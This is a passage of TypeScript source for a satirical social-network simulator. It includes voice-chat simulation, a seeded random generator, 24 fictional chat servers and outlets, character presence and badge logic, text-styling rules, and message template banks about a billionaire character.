  for (let i = 0, n = rng.int(14, 30); i < n; i++) (banner.reactionLog ??= []).push([rng.pick(["😭", "🎙️", "👑", "🔥", "🏃", "‼️"]), Math.round(now + rng.range(0.5, 20) * SEC), rng.pick(srv.members)]);
  banner.reactionLog!.sort((a, b) => a[1] - b[1]);
  s.pending.push(banner);
  const talkers = pickPeople(s, rng, srv, rng.int(4, 7), now, (o) => (fanish(o) ? 4 : 1));
  let t = now + rng.range(0.9, 1.6) * SEC;
  for (const c of talkers) {
    const o = obsessionOf(c);
    msg(s, c, serverId, ch.id, line(s, rng, c, negish(o) ? B.voiceNeg : B.voiceChat, sl(s, rng, c)), t, t - rng.range(0.8, 2) * SEC, { intent: "voiceHype", replyTo: rng.chance(0.3) ? banner.id : undefined });
    t += rng.range(0.6, 2.2) * SEC;
  }
  addOverheard(s, rng, srv, vcId, now + 2 * SEC, 14, [...present, ...followers.map((c) => c.id)]);
  moment(s, { t: now, kind: "voice", text: `You joined ${vc.name} in ${srv.name}. ${joiners.length} people followed you in`, link: `lounge:${serverId}:${ch.id}` });
  return { joiners: joiners.length };
}

function addOverheard(s: WorldState, rng: Rng, srv: Server, vcId: string, from: number, n: number, ids: string[]) {
  if (!ids.length || !s.voice) return;
  let t = from;
  for (let i = 0; i < n; i++) {
    t += rng.range(4, 14) * SEC;
    const c = charById(s, rng.pick(ids));
    s.voice.lines.push({ t: Math.round(t), serverId: srv.id, channelId: vcId, who: c.id, text: rng.pick(B.overheard) });
  }
  if (s.voice.lines.length > 80) s.voice.lines.splice(0, s.voice.lines.length - 80);
}

/** keep the transcript ticker going while god hangs out in voice (called per bucket) */
export function voiceTick(s: WorldState, t1: number) {
  const g = s.voice?.god;
  if (!g || g.leftAt) return;
  if (t1 - g.since > 3 * 60 * MIN) { godLeaveVoice(s, t1, true); return; } // nobody stays in vc forever
  const last = s.voice!.lines.filter((l) => l.channelId === g.channelId).at(-1);
  if (last && last.t > t1 + 20 * SEC) return;
  const srv = s.servers.find((x) => x.id === g.serverId);
  if (!srv) return;
  const rng = rngFor(s.seed, "vctick", Math.floor(t1 / 10000));
  addOverheard(s, rng, srv, g.channelId, Math.max(t1, last?.t ?? 0), 6, g.joiners.map(([id]) => id));
}

export function godLeaveVoice(s: WorldState, now: number, quiet = false) {
  const g = s.voice?.god;
  if (!g || g.leftAt) return;
  g.leftAt = now;
  s.voice!.lines = s.voice!.lines.filter((l) => l.t <= now);
  const srv = s.servers.find((x) => x.id === g.serverId);
  if (!srv) return;
  const mins = Math.max(1, Math.round((now - g.since) / MIN));
  if (!quiet) {
    const rng = rngFor(s.seed, "vcleave", Math.floor(now / 1000));
    const ch = chatChannel(srv);
    let t = now + rng.range(1, 2) * SEC;
    for (const c of pickPeople(s, rng, srv, rng.int(1, 3), now, (o) => (fanish(o) ? 4 : 1))) {
      msg(s, c, srv.id, ch.id, line(s, rng, c, B.voiceLeave, sl(s, rng, c)), t, t - 1500, { intent: "voiceLeave" });
      t += rng.range(1, 3) * SEC;
    }
  }
  moment(s, { t: now, kind: "voiceLeave", text: `You left voice in ${srv.name} after ${mins} min`, link: `lounge:${srv.id}:${chatChannel(srv).id}` });
}

export function overheardAt(s: WorldState, vcId: string, now: number, n = 4) {
  return (s.voice?.lines ?? []).filter((l) => l.channelId === vcId && l.t <= now).slice(-n);
}

```

## src/lib/sim/rng.ts
```ts
/** Seeded, serialisable PRNG (mulberry32). Same seed ⇒ same sequence. */
export class Rng {
  state: number;
  constructor(seed: number) {
    this.state = seed >>> 0;
  }
  next(): number {
    let t = (this.state = (this.state + 0x6d2b79f5) >>> 0);
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  }
  range(min: number, max: number): number {
    return min + (max - min) * this.next();
  }
  int(min: number, max: number): number {
    return Math.floor(this.range(min, max + 1));
  }
  chance(p: number): boolean {
    return this.next() < p;
  }
  pick<T>(arr: readonly T[]): T {
    return arr[Math.floor(this.next() * arr.length)];
  }
  weighted<T>(items: readonly T[], weight: (t: T) => number): T {
    let total = 0;
    for (const it of items) total += Math.max(0, weight(it));
    let r = this.next() * total;
    for (const it of items) {
      r -= Math.max(0, weight(it));
      if (r <= 0) return it;
    }
    return items[items.length - 1];
  }
  /** Poisson sample (Knuth for small λ, normal approx for big). */
  poisson(lambda: number): number {
    if (lambda <= 0) return 0;
    if (lambda > 30) return Math.max(0, Math.round(lambda + Math.sqrt(lambda) * this.gauss()));
    const L = Math.exp(-lambda);
    let k = 0;
    let p = 1;
    do {
      k++;
      p *= this.next();
    } while (p > L);
    return k - 1;
  }
  gauss(): number {
    const u = Math.max(1e-9, this.next());
    const v = this.next();
    return Math.sqrt(-2 * Math.log(u)) * Math.cos(2 * Math.PI * v);
  }
  shuffle<T>(arr: T[]): T[] {
    for (let i = arr.length - 1; i > 0; i--) {
      const j = Math.floor(this.next() * (i + 1));
      [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
  }
}

export function hash(...parts: (string | number)[]): number {
  let h = 2166136261;
  const s = parts.join("|");
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  h ^= h >>> 13;
  h = Math.imul(h, 0x5bd1e995);
  h ^= h >>> 15;
  return h >>> 0;
}

export const rngFor = (...parts: (string | number)[]) => new Rng(hash(...parts));

```

## src/lib/sim/servers.ts
```ts
import type { Outlet } from "./types";

export interface ServerDef {
  id: string;
  name: string;
  icon: string;
  color: string;
  description: string;
  bias: number;
  vibe: string; // reaction culture key (see data.REACTIONS)
  tags: string[];
  size: number; // displayed member count
  cast: number; // simulated speaking members
  channels: [name: string, topic: string, tags: string[], weight?: number][];
  jokes: string[];
}

/** 24 fictional servers. Channel weight ~ share of traffic (#general carries most, per research §5). */
export const SERVER_DEFS: ServerDef[] = [
  { id: "godhq", name: "GOD HQ", icon: "👑", color: "#e8b84a", description: "The official-unofficial home of everything @god.", bias: 0.45, vibe: "glaze", tags: ["god", "wealth"], size: 184_220, cast: 90,
    channels: [["general", "talk about anything (mostly god)", ["god", "life", "world"], 5], ["god-announcements", "only god posts here", ["god"], 0.2], ["god-news", "news drops + articles", ["god", "news"], 1.2], ["fan-discussion", "theories, takes, debates", ["god", "drama"], 1.5], ["wealth-discussion", "net worth math & money talk", ["wealth", "business"], 1.2], ["exclusive-chat", "level 20+ only", ["god", "luxury"], 0.6], ["memes", "post the funnies", ["memes", "god"], 1.4], ["leaks-and-rumors", "unverified. treat it that way", ["rumor", "god", "drama"], 1]],
    jokes: ["the 3am ping", "the 'creative mode' copypasta", "the lambo-in-the-pool incident", "mod tomas's 'last warning' count"] },
  { id: "cryptoug", name: "Crypto Underground", icon: "🕳️", color: "#7c5cff", description: "Degens, analysts and survivors of every cycle.", bias: 0.05, vibe: "finance", tags: ["crypto", "memecoins"], size: 96_400, cast: 70,
    channels: [["market-discussion", "macro, majors, vibes", ["crypto", "world"], 4], ["god-portfolio", "tracking every god wallet rumor", ["god", "crypto", "wealth"], 1.6], ["memecoins", "frogs, dogs and regret", ["memecoins", "crypto"], 2.5], ["trading-signals", "NFA. seriously.", ["crypto"], 1], ["whale-watching", "big wallets moving", ["crypto", "wealth"], 1]],
    jokes: ["the guy who sold at the bottom twice", "'wen'", "the rug of '24 that nobody talks about", "chart crimes"] },
  { id: "netculture", name: "Internet Culture", icon: "🌐", color: "#30c6e8", description: "Whatever the internet is mad about today.", bias: 0, vibe: "culture", tags: ["celebrity", "drama", "memes"], size: 241_000, cast: 80,
    channels: [["celebrity-discussion", "famous people doing things", ["celebrity", "god"], 2], ["chirp-drama", "screenshots from Chirp", ["drama", "god", "celebrity"], 2], ["viral-moments", "what's blowing up", ["memes", "world", "god"], 2], ["internet-news", "the timeline, summarized", ["news", "world"], 1.5]],
    jokes: ["main character of the day", "the ratio hall of fame", "'who is this guy and why is he trending'"] },
  { id: "billionaire", name: "Billionaire Club", icon: "💎", color: "#d4af37", description: "Aspirational luxury talk. Mostly window shopping.", bias: 0.2, vibe: "luxury", tags: ["luxury", "wealth"], size: 58_900, cast: 55,
    channels: [["luxury-lifestyle", "watches, villas, vibes", ["luxury", "god"], 2.5], ["business", "deals and moves", ["business", "wealth"], 1.5], ["private-islands", "sand, sea, and tax lawyers", ["islands", "luxury"], 1], ["supercars", "spec sheets & spotted", ["cars", "luxury"], 1.4], ["private-jets", "tail numbers & cabins", ["jets", "luxury"], 1.1]],
    jokes: ["'just buy the island bro'", "the guy who rents the Lambo for photos", "the 'what's your net worth' thread"] },
  { id: "fanclub", name: "GOD Fan Club", icon: "🙏", color: "#ff7ab6", description: "Glazing is a lifestyle. Be nice.", bias: 0.9, vibe: "glaze", tags: ["god", "glaze"], size: 132_500, cast: 75,
    channels: [["daily-glazing", "say something nice about god (daily)", ["god", "glaze"], 4], ["god-is-legendary", "certified legendary moments", ["god", "glaze"], 1.5], ["fan-art", "post your art", ["god", "art"], 0.8], ["god-moments", "clips and screenshots", ["god"], 1.2], ["community-events", "watch parties & meetups", ["god", "life"], 0.6]],
    jokes: ["the glaze leaderboard", "'he's just like us' (he is not)", "the fan art that looked like a potato"] },
  { id: "respawn", name: "Respawn Lounge", icon: "🎮", color: "#4ade80", description: "Gaming, LFG and rage-quits.", bias: 0, vibe: "gaming", tags: ["gaming"], size: 77_300, cast: 60,
    channels: [["general", "gaming talk", ["gaming", "life", "world"], 4], ["patch-notes", "nerfs, buffs, crying", ["gaming"], 1.2], ["clips", "post your clips", ["gaming", "memes"], 1], ["off-topic", "anything else", ["life", "god", "world"], 1]],
    jokes: ["'skill issue'", "the 0-14 game", "the duo who never shows up"] },
  { id: "newsroom", name: "Breaking Wire Room", icon: "📰", color: "#f97316", description: "Fast news, slower fact checks.", bias: 0, vibe: "news", tags: ["news"], size: 64_100, cast: 45,
    channels: [["breaking", "drop links, add context", ["news", "god", "world"], 3], ["fact-check", "is it real?", ["rumor", "news"], 1.2], ["analysis", "longer takes", ["news", "business"], 1]],
    jokes: ["'source?'", "the satire site incident", "the headline-only readers"] },
  { id: "creators", name: "Creator Collective", icon: "🎬", color: "#ec4899", description: "Influencers, editors, managers, clout.", bias: 0.1, vibe: "culture", tags: ["celebrity", "business"], size: 41_800, cast: 50,
    channels: [["general", "creator talk", ["celebrity", "life", "god"], 3], ["collabs", "who's working with who", ["celebrity", "business", "god"], 1.2], ["analytics", "views, CPMs, pain", ["business"], 0.8]],
    jokes: ["'the algorithm hates me'", "the collab that never dropped", "thumbnail face"] },
  { id: "vault", name: "The Vault", icon: "🔐", color: "#94a3b8", description: "Invite-only. Old money, new money, quiet money.", bias: 0.1, vibe: "luxury", tags: ["wealth", "luxury", "business"], size: 1_240, cast: 30,
    channels: [["lounge", "members only", ["wealth", "god", "luxury"], 2], ["deals", "off-market", ["business", "wealth"], 1.2], ["concierge", "recommendations", ["luxury", "life"], 0.7]],
    jokes: ["the yacht parking dispute", "'my guy in Monaco'"] },
  { id: "founders", name: "Founders Floor", icon: "🏗️", color: "#22d3ee", description: "Builders, operators and pitch-deck enjoyers.", bias: 0.1, vibe: "finance", tags: ["business", "tech"], size: 52_600, cast: 50,
    channels: [["general", "building stuff", ["business", "tech", "life"], 3], ["fundraising", "rounds & valuations", ["business", "wealth"], 1.2], ["god-deals", "tracking god's companies", ["god", "business"], 1.3], ["hiring", "jobs & talent", ["business"], 0.6]],
    jokes: ["'we're pre-revenue'", "the pivot to AI", "the 4am grind post"] },
  { id: "pumppit", name: "Pump Pit", icon: "🐸", color: "#84cc16", description: "Memecoin casino with a chat window.", bias: 0.2, vibe: "finance", tags: ["memecoins", "crypto"], size: 88_800, cast: 60,
    channels: [["degen-floor", "aping in real time", ["memecoins", "crypto", "god"], 4], ["god-coin-watch", "every god coin rumor", ["god", "memecoins"], 1.4], ["rug-reports", "pain", ["memecoins", "drama"], 0.8]],
    jokes: ["'it's only a loss if you sell'", "the frog that did 400x", "exit liquidity jokes"] },
  { id: "grass", name: "Touch Grass Society", icon: "🌱", color: "#65a30d", description: "Normal people talking about normal things.", bias: -0.05, vibe: "culture", tags: ["life"], size: 33_400, cast: 50,
    channels: [["general", "life, weather, food", ["life", "world"], 4], ["pets", "post your pets", ["life"], 1.2], ["rants", "vent safely", ["life", "drama", "god"], 1]],
    jokes: ["the sourdough guy", "'go outside' (said indoors)"] },
  { id: "overrated", name: "Overrated HQ", icon: "🧢", color: "#ef4444", description: "Not impressed. Never were.", bias: -0.8, vibe: "hater", tags: ["god", "drama"], size: 29_700, cast: 55,
    channels: [["general", "he's mid and here's why", ["god", "drama"], 4], ["receipts", "evidence board", ["god", "rumor"], 1.2], ["cope-tracker", "fan meltdowns", ["god", "memes"], 1]],
    jokes: ["the 'paid actors' theory", "'ratio him'", "the fan who got banned for glazing here"] },
  { id: "rabbithole", name: "Rabbit Hole", icon: "🕳", color: "#a855f7", description: "Connect the dots. Some dots are imaginary.", bias: -0.2, vibe: "conspiracy", tags: ["conspiracy", "rumor"], size: 22_100, cast: 40,
    channels: [["theories", "think about it", ["conspiracy", "god", "world"], 3], ["evidence", "blurry photos only", ["conspiracy", "rumor"], 1], ["debunked", "the graveyard", ["conspiracy"], 0.5]],
    jokes: ["'the island has a second island'", "the timestamp theory", "'he's three people'"] },
  { id: "tearoom", name: "The Tea Room", icon: "☕", color: "#f59e0b", description: "Celebrity gossip, served hot.", bias: 0.05, vibe: "gossip", tags: ["celebrity", "drama"], size: 119_000, cast: 65,
    channels: [["hot-tea", "the latest", ["celebrity", "drama", "god"], 3.5], ["blind-items", "guess who", ["rumor", "celebrity", "god"], 1.2], ["couples-watch", "who's dating who", ["celebrity"], 1]],
    jokes: ["the blind item that was obviously god", "'sources close to'", "the unfollow investigation"] },
  { id: "chartgremlins", name: "Chart Gremlins", icon: "📈", color: "#10b981", description: "Lines on charts. Strong opinions.", bias: 0, vibe: "finance", tags: ["stocks", "crypto", "business"], size: 47_000, cast: 45,
    channels: [["markets", "stocks, macro", ["stocks", "business", "world"], 3], ["god-index", "tracking the god effect", ["god", "wealth"], 1.2], ["loss-porn", "share your pain", ["crypto", "memes"], 0.8]],
    jokes: ["'support is a feeling'", "the head-and-shoulders on everything", "the god effect index"] },
  { id: "memefactory", name: "Meme Factory", icon: "🏭", color: "#fbbf24", description: "We make the memes you repost.", bias: 0.1, vibe: "culture", tags: ["memes"], size: 156_700, cast: 70,
    channels: [["shitposting", "low effort, high reward", ["memes", "god", "world"], 4], ["templates", "fresh formats", ["memes"], 1], ["god-memes", "the man, the memes", ["god", "memes"], 1.8]],
    jokes: ["the 'creative mode' template", "the deep-fried era", "'this is going in the hall of fame'"] },
  { id: "latenight", name: "Late Night Lounge", icon: "🌙", color: "#6366f1", description: "For people who should be asleep.", bias: 0, vibe: "culture", tags: ["life"], size: 38_200, cast: 45,
    channels: [["2am-thoughts", "unfiltered", ["life", "god", "world"], 3], ["music", "what are you listening to", ["music", "life"], 1.2], ["insomnia", "can't sleep club", ["life"], 1]],
    jokes: ["'why are we all awake'", "the 4am philosophy debate"] },
  { id: "wheelswings", name: "Wheels & Wings", icon: "✈️", color: "#38bdf8", description: "Supercars, jets, and spotting.", bias: 0.2, vibe: "luxury", tags: ["cars", "jets"], size: 61_300, cast: 45,
    channels: [["spotted", "post your spots", ["cars", "jets", "god"], 2.5], ["specs", "numbers nerds", ["cars", "jets"], 1.2], ["god-garage", "everything god owns that moves", ["god", "cars", "jets"], 1.3]],
    jokes: ["the tail-number detectives", "the guy who only posts brake calipers"] },
  { id: "pixelarena", name: "Pixel Arena", icon: "🕹️", color: "#f43f5e", description: "Esports, ranked, tournaments.", bias: -0.05, vibe: "gaming", tags: ["gaming"], size: 70_900, cast: 50,
    channels: [["ranked", "climb or cry", ["gaming"], 3], ["tournaments", "brackets & upsets", ["gaming", "world"], 1.2], ["off-topic", "not gaming", ["life", "god"], 1]],
    jokes: ["'hardstuck'", "the throw of the century", "'diff'"] },
  { id: "skeptics", name: "Skeptics Anonymous", icon: "🧐", color: "#a3a3a3", description: "Extraordinary claims require receipts.", bias: -0.35, vibe: "news", tags: ["rumor", "god", "news"], size: 18_900, cast: 40,
    channels: [["claims", "post claims, we check", ["god", "rumor"], 3], ["math", "does the net worth add up", ["wealth", "god"], 1.2]],
    jokes: ["'source: his own post'", "the spreadsheet that broke the server"] },
  { id: "hustleu", name: "Hustle University", icon: "📚", color: "#eab308", description: "Mindset, grind, and studying the greats.", bias: 0.55, vibe: "glaze", tags: ["business", "god"], size: 104_300, cast: 60,
    channels: [["mindset", "daily grind", ["business", "god", "life"], 3], ["case-studies", "breaking down god's moves", ["god", "business"], 1.5], ["wins", "post your wins", ["life", "business"], 1]],
    jokes: ["'what would god do'", "the 5am club roll call"] },
  { id: "otaku", name: "Otaku Den", icon: "🍙", color: "#fb7185", description: "Anime, manga, and seasonal debates.", bias: 0, vibe: "culture", tags: ["anime"], size: 66_000, cast: 45,
    channels: [["seasonal", "this season's shows", ["anime", "life"], 3], ["off-topic", "everything else", ["life", "god", "world"], 1.2]],
    jokes: ["'the filler arc'", "the 3-hour tier list fight"] },
  { id: "globalwatch", name: "Global Watch", icon: "🛰️", color: "#0ea5e9", description: "World events and the business of everything.", bias: 0, vibe: "news", tags: ["news", "world"], size: 39_400, cast: 40,
    channels: [["world", "global headlines", ["world", "news"], 3], ["markets", "money moves", ["business", "wealth", "god"], 1.2]],
    jokes: ["'this will be in textbooks'", "the map guy"] },
];

/** Outlets that only ever cover their own beats (never fall back to off-topic stories). */
export const STRICT_BEATS: Record<string, string[]> = { gwr: ["wealth", "business", "luxury", "markets", "investment", "property", "island", "jet", "coin", "crypto"] };

export const OUTLETS: Outlet[] = [
  { id: "godwatch", name: "GODWATCH", short: "GW", color: "#e8b84a", bias: 0.3, tagline: "Every move. Every dollar.", beats: ["god"], authors: [{ name: "Marta Kessling", role: "Chief GOD correspondent" }, { name: "Dev Anand", role: "Senior reporter" }, { name: "Lio Brandt", role: "Night editor" }] },
  { id: "internetdaily", name: "Internet Daily", short: "ID", color: "#30c6e8", bias: 0, tagline: "The timeline, explained.", beats: ["celebrity", "drama", "memes", "god"], authors: [{ name: "Sasha Vey", role: "Culture writer" }, { name: "Rory Quint", role: "Trends reporter" }] },
  { id: "gwr", name: "Global Wealth Report", short: "GWR", color: "#d4af37", bias: 0.1, tagline: "Money, ranked.", beats: ["wealth", "business", "luxury", "markets", "investment", "property", "island", "jet", "coin", "crypto"], authors: [{ name: "Helena Oduya", role: "Wealth editor" }, { name: "Tomasz Reil", role: "Markets analyst" }] },
  { id: "cryptoinsider", name: "Crypto Insider", short: "CI", color: "#7c5cff", bias: 0, tagline: "On-chain, on time.", beats: ["crypto", "memecoins"], authors: [{ name: "Kai Moreno", role: "Crypto reporter" }, { name: "Nadia Fern", role: "DeFi analyst" }] },
  { id: "digitaltimes", name: "The Digital Times", short: "DT", color: "#e5e7eb", bias: -0.2, tagline: "Serious coverage of unserious times.", beats: ["tech", "business", "drama", "god"], authors: [{ name: "Owen Achterberg", role: "Investigations" }, { name: "Priya Lal", role: "Opinion columnist" }] },
  { id: "bnn", name: "Billionaire News Network", short: "BNN", color: "#f43f5e", bias: 0.15, tagline: "LIVE from the top 0.0001%.", beats: ["wealth", "luxury", "god", "islands", "jets"], authors: [{ name: "Chase Whitlow", role: "Anchor" }, { name: "Gemma Sato", role: "Field reporter" }] },
];

```

## src/lib/sim/social.ts
```ts
import type { Character, Message, Obsession, Server, WorldState } from "./types";
import { diurnal } from "./engine";

/** Obsession level is derived from stance + current opinion, so it evolves as opinions move. */
export function obsessionOf(c: Character): Obsession {
  const o = c.opinion;
  if (c.stance === "worshipper" || o >= 72) return "obsessed";
  if (c.stance === "hater" || o <= -60) return "hater";
  if (c.stance === "jealous") return o > 20 ? "supporter" : "rival";
  if (c.stance === "analyst") return o < -30 ? "skeptic" : "business";
  if (c.stance === "skeptic" || c.stance === "conspiracist") return o > 40 ? "supporter" : "skeptic";
  if (c.stance === "indifferent") return o > 45 ? "supporter" : o < -40 ? "skeptic" : "indifferent";
  return o < -25 ? "skeptic" : "supporter"; // fan, memer
}

export const OBSESSION_INFO: Record<Obsession, { label: string; color: string }> = {
  obsessed: { label: "Obsessed fan", color: "#e8b84a" },
  supporter: { label: "Supporter", color: "#facc15" },
  business: { label: "Business admirer", color: "#22d3ee" },
  skeptic: { label: "Skeptic", color: "#a3a3a3" },
  rival: { label: "Jealous rival", color: "#f97316" },
  hater: { label: "Hater", color: "#ef4444" },
  indifferent: { label: "Indifferent", color: "#64748b" },
};

export type Presence = "online" | "idle" | "offline";

/** Presence is backed by real activity: posted recently ⇒ online, awake but quiet ⇒ idle. */
export function presenceOf(c: Character, lastMsgT: number | undefined, now: number): Presence {
  if (lastMsgT !== undefined && now - lastMsgT < 20 * 60e3) return "online";
  const d = diurnal(c, now);
  if (lastMsgT !== undefined && now - lastMsgT < 3 * 3600e3 && d > 0.35) return "idle";
  return d > 0.75 && c.tier !== "lurker" ? "idle" : "offline";
}

export interface Badge { label: string; color: string }
/** Roles/badges shown in the member list and on profiles. */
export function badgesFor(c: Character, srv?: Server): Badge[] {
  const b: Badge[] = [];
  if (srv?.moderators.includes(c.id)) b.push({ label: "Mod", color: "#5eead4" });
  if (c.core) b.push({ label: "Regular", color: "#e8b84a" });
  if ((c.bond ?? 0) >= 25) b.push({ label: "Noticed by god", color: "#fde68a" });
  if (c.influencer) b.push({ label: "Creator", color: "#a78bfa" });
  const ob = obsessionOf(c);
  if (ob === "obsessed") b.push({ label: "Top fan", color: "#e8b84a" });
  if (ob === "hater") b.push({ label: "Hater", color: "#ef4444" });
  if (ob === "rival") b.push({ label: "Rival", color: "#f97316" });
  if (c.netWorthBand >= 4) b.push({ label: "Whale", color: "#38bdf8" });
  return b.slice(0, 3);
}

/** last message time per author across the world (one pass, newest first). */
export function lastSeenMap(s: WorldState, now: number, serverId?: string, scan = 4000): Map<string, number> {
  const out = new Map<string, number>();
  const add = (m: Message) => { if (m.t <= now && (!serverId || m.serverId === serverId) && (out.get(m.authorId) ?? -1) < m.t) out.set(m.authorId, m.t); };
  for (let i = s.pending.length - 1; i >= 0; i--) add(s.pending[i]);
  for (let i = s.messages.length - 1, n = 0; i >= 0 && n < scan; i--, n++) add(s.messages[i]);
  return out;
}

```

## src/lib/sim/style.ts
```ts
import type { Rng } from "./rng";
import type { Character } from "./types";

const KEEP_CASE = /(@[\w.]+|#[\w-]+|\$[A-Z0-9]+)/g;

function lowerKeep(s: string) {
  return s.split(KEEP_CASE).map((p, i) => (i % 2 ? p : p.toLowerCase())).join("");
}

/** Adjacent-swap / drop / double letter typo on one word (research §2). */
export function typo(rng: Rng, s: string): { text: string; word?: string } {
  const words = s.split(" ");
  const idx = words.map((w, i) => [w, i] as const).filter(([w]) => /^[a-z]{4,}$/i.test(w));
  if (!idx.length) return { text: s };
  const [w, i] = rng.pick(idx);
  const k = rng.int(1, w.length - 2);
  const kind = rng.int(0, 2);
  const bad = kind === 0 ? w.slice(0, k) + w[k + 1] + w[k] + w.slice(k + 2) : kind === 1 ? w.slice(0, k) + w.slice(k + 1) : w.slice(0, k) + w[k] + w.slice(k);
  words[i] = bad;
  return { text: words.join(" "), word: w.toLowerCase() };
}

/**
 * Apply a character's voice consistently. Same character ⇒ same tendencies
 * (casing, punctuation, slang, emoji placement), per docs/research.md §2.
 */
export function styleText(rng: Rng, c: Character, raw: string, opts: { allowTypo?: boolean; short?: boolean } = {}): { text: string; typoWord?: string; clean?: string } {
  let s = raw.trim();
  const v = c.voice;
  if (opts.short && (v === "terse" || v === "zoomer") && s.length > 40 && rng.chance(0.5)) {
    const cut = s.split(/[,.;]| and | but /)[0];
    if (cut.length > 6) s = cut;
  }
  // slang insertion
  if (v !== "formal" && v !== "proper" && rng.chance(v === "boomer" ? 0.15 : v === "zoomer" ? 0.45 : 0.28)) {
    const sl = rng.pick(c.slang);
    s = rng.chance(0.6) ? `${s} ${sl}` : `${sl} ${s}`;
  }
  switch (v) {
    case "zoomer":
    case "lowercase":
      s = lowerKeep(s).replace(/[.]+$/g, "").replace(/\. /g, rng.chance(0.5) ? " " : ". ");
      s = s.replace(/'/g, rng.chance(0.6) ? "" : "'");
      if (v === "zoomer" && rng.chance(0.15)) s = s.replace(/\b(so|no|bro|what|why)\b/, (m) => m + m[m.length - 1].repeat(rng.int(2, 4)));
      break;
    case "caps":
      if (rng.chance(0.55)) s = s.split(KEEP_CASE).map((p, i) => (i % 2 ? p : p.toUpperCase())).join("");
      if (rng.chance(0.4)) s = s.replace(/[.!]*$/, "!".repeat(rng.int(1, 3)));
      break;
    case "millennial":
      if (rng.chance(0.3)) s = s.replace(/[.]?$/, rng.chance(0.5) ? " lol" : " haha");
      s = s[0].toUpperCase() + s.slice(1);
      break;
    case "proper":
      s = s[0].toUpperCase() + s.slice(1);
      if (!/[.!?"]$/.test(s) && !/\p{Extended_Pictographic}$/u.test(s)) s += ".";
      break;
    case "boomer":
      s = s[0].toUpperCase() + s.slice(1);
      if (rng.chance(0.45)) s = s.replace(/[.!?]*$/, rng.pick(["...", "!!", ". ", "!!!"]));
      if (rng.chance(0.12)) s = s.replace(/^/, rng.pick(["Well ", "Folks, ", "Hmm. "]));
      break;
    case "terse":
      s = lowerKeep(s).replace(/[.!]+$/g, "");
      break;
    case "emoji":
      s = lowerKeep(s).replace(/[.]+$/g, "");
      break;
    case "formal":
      s = s[0].toUpperCase() + s.slice(1);
      if (!/[.!?"]$/.test(s)) s += ".";
      break;
  }
  // emoji, appended (research: trailing position, 💀/😭 over 😂 for younger voices)
  if (rng.chance(c.emojiRate) && !/\p{Extended_Pictographic}$/u.test(s)) {
    let e = rng.pick(c.emojis);
    if (v === "emoji" && rng.chance(0.5)) e = e + e;
    s = `${s} ${e}`;
  }
  let typoWord: string | undefined;
  const clean = s;
  if (opts.allowTypo !== false && rng.chance(c.typoRate)) {
    const t = typo(rng, s);
    s = t.text;
    typoWord = t.word;
  }
  return { text: s, typoWord, clean: typoWord ? clean : undefined };
}

```

## src/lib/sim/templates.ts
```ts
/* Template banks. Slots: {god} {label} {subj} {amt} {tag} {celeb} {cmp} {thing} {user} {past} {ch} {server} {world} {personal} {outlet} {n} {coin} {laugh} {hype} {shade} */
import type { Stance } from "./types";

export const CMP = [
  "my entire bloodline", "my whole family tree", "my city's annual budget", "every job i will ever have", "my rent for 400 years", "my student loans x1000",
  "the GDP of my hometown", "my car (it's a 2009 civic)", "my net worth in pokemon cards", "my dad's entire retirement", "my whole street", "my 401k, my soul and my cat",
];
export const THING = ["a sandwich", "a hoodie", "gas money", "a concert ticket", "groceries", "a used scooter", "a parking ticket", "an energy drink", "rent", "a phone case"];

/** Openers about a @god topic, by stance. {label} is the topic label ("the island purchase"). */
export const GOD_OPEN: Record<Stance, string[]> = {
  worshipper: [
    "{god} is actually playing life on creative mode {laugh}", "HOW DOES THIS GUY KEEP WINNING", "{god} literally owns the internet at this point", "someone explain how this man casually did {label}",
    "bro's side quests are worth more than {cmp}", "not {god} doing {label} on a random {day} {hype}", "i woke up and {god} already did {label}. what did YOU do today", "{label} is the most {god} thing ever {hype}",
    "we are witnessing history and half of yall are asleep", "every day i wake up grateful to be in the same timeline as {god}", "{god} said 'watch this' and the whole internet watched", "the {label} is a masterclass. study it",
    "imagine being so rich {label} is a tuesday activity", "{god} doesn't chase trends, trends chase {god}", "if {god} sneezes the market moves fr", "my therapist asked who my role model is. i said {god} and showed her {label}",
    "glazing is not enough. we need a new word for what {god} deserves", "{god} could buy {cmp} and still have lunch money", "the aura on this man after {label} {hype}", "{label}??? he's not human",
  ],
  fan: [
    "ok {label} is actually kinda insane", "ngl {label} was a power move", "lowkey love that {god} just does stuff", "{label} has me hyped ngl", "i'm a fan but {label} is wild even for him",
    "{god} doing {label} is the content i signed up for", "can't lie {label} goes hard", "the {label} thing is so funny to me, he just does whatever", "rooting for him on this one", "honestly respect the {label} move",
    "this is why i joined this server lol", "{label} is peak {god}", "not gonna pretend i understand the money but {label} sounds sick", "ok {god} cooked with {label}", "W {label}",
  ],
  memer: [
    "{god} after {label}: 'it was a small purchase' {laugh}", "me checking my bank app after reading about {label} 🧍", "pov: you're the intern who has to explain {label} to the accountant", "{label} speedrun any%",
    "{god}: buys {subj}. me: buys {thing}. we are not the same", "this is going in #memes immediately", "new template just dropped: '{god} after {label}'", "{label} but every time he does it a frog gets a lambo",
    "my mom asked if i'm like {god}. i said yes i also did {label} (i bought {thing})", "breaking: local man still processing {label}", "the {label} arc is my favorite season of the internet", "{god} is the final boss of capitalism and {label} was his ult",
    "average {god} enjoyer vs average {label} hater", "someone make the {label} wojak rn", "{label} has the same energy as buying a second fridge but it's {amt}",
  ],
  analyst: [
    "Back of the envelope: {label} at {amt} is maybe a low single-digit % of his estimated net worth.", "Interesting move. {label} only makes sense if he's playing a longer game.", "People are overreacting to {label}. Look at the actual numbers.",
    "{label}: reported {amt}. Nobody has verified the figure yet.", "my take on {label}: smart on paper, risky on execution", "the market reaction to {label} is more interesting than the thing itself",
    "Ran the numbers on {label}. If the {amt} figure is right, it's aggressive but not crazy.", "The real story with {label} is the signaling, not the money.", "Wait for filings before you get excited about {label}.", "{label} tells you where he thinks the next cycle is",
  ],
  skeptic: [
    "source on {label}? because i only see his own post", "{label} sounds made up ngl", "anyone actually verified {label} or are we just vibing", "funny how {label} drops right when people were talking about the other thing",
    "i'll believe {label} when i see paperwork", "{amt}? says who?", "half of these {label} numbers are coming from fan accounts lol", "not saying {label} is fake. saying nobody here has checked",
    "the {label} story has changed three times today", "watch {label} quietly turn out to be a lease",
  ],
  hater: [
